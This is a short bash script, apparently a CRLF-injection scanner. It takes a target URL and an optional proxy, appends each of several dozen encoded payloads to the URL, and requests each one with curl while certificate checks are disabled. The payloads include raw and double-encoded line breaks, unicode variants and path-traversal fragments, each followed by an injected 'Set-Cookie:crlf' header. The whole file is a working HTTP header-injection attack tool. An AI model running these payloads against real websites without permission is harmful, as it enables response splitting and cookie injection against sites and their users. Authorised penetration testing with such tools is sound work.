#!/bin/bash

# Check if at least the URL is provided
if [ -z "$1" ]; then
  echo "Usage: $0 <base_url> [proxy_url]"
  exit 1
fi

# Base URL
BASE_URL=$1

# Proxy URL
PROXY_URL=$2

# Combined list of unsafe, percent-encoded characters, including the new ones
declare -a ENCODED_CHARS=(
  "%21Set-Cookie:crlf" "%23Set-Cookie:crlf" "%24Set-Cookie:crlf" "%26Set-Cookie:crlf" "%27Set-Cookie:crlf" 
  "%28Set-Cookie:crlf" "%29Set-Cookie:crlf" "%2ASet-Cookie:crlf" "%2BSet-Cookie:crlf" "%2CSet-Cookie:crlf" 
  "%2FSet-Cookie:crlf" "%3ASet-Cookie:crlf" "%3BSet-Cookie:crlf" "%3DSet-Cookie:crlf" "%3FSet-Cookie:crlf" 
  "%40Set-Cookie:crlf" "%5BSet-Cookie:crlf" "%5DSet-Cookie:crlf" "%00Set-Cookie:crlf" "%20Set-Cookie:crlf" 
  "%22Set-Cookie:crlf" "%3CSet-Cookie:crlf" "%3ESet-Cookie:crlf" "%60Set-Cookie:crlf" "%5ESet-Cookie:crlf" 
  "%5CSet-Cookie:crlf" "%7CSet-Cookie:crlf" "%7ESet-Cookie:crlf" "%25Set-Cookie:crlf" "%7BSet-Cookie:crlf" 
  "%7DSet-Cookie:crlf" "%0DSet-Cookie:crlf" "%0ASet-Cookie:crlf" "%09Set-Cookie:crlf"
  "%25%30%61Set-Cookie:crlf" "%25%30aSet-Cookie:crlf" "%250aSet-Cookie:crlf" "%25250aSet-Cookie:crlf" 
  "%2e%2e%2f%0d%0aSet-Cookie:crlf" "%2f%2e%2e%0d%0aSet-Cookie:crlf" "%2F..%0d%0aSet-Cookie:crlf" 
  "%3f%0d%0aSet-Cookie:crlf" "%3f%0dSet-Cookie:crlf" "%u000aSet-Cookie:crlf" "%E5%98%8D%E5%98%8ASet-Cookie:crlf" 
  "%0a0aSet-Cookie:crlf" "%0aSet-Cookie:crlf" "%0d%0aSet-Cookie:crlf" "%0dSet-Cookie:crlf" "%23%0aSet-Cookie:crlf" 
  "%23%0d%0aSet-Cookie:crlf" "%23%0dSet-Cookie:crlf"
)

# Loop through each encoded character and make a GET request
for char in "${ENCODED_CHARS[@]}"
do
  TEST_URL="${BASE_URL}${char}"
  echo "Testing URL: $TEST_URL"
  
  # If proxy is set, use it
  if [ -z "$PROXY_URL" ]; then
    curl -k -s $TEST_URL
  else
    curl -k -s -x $PROXY_URL $TEST_URL
  fi
  
  echo "-------------------------"
done
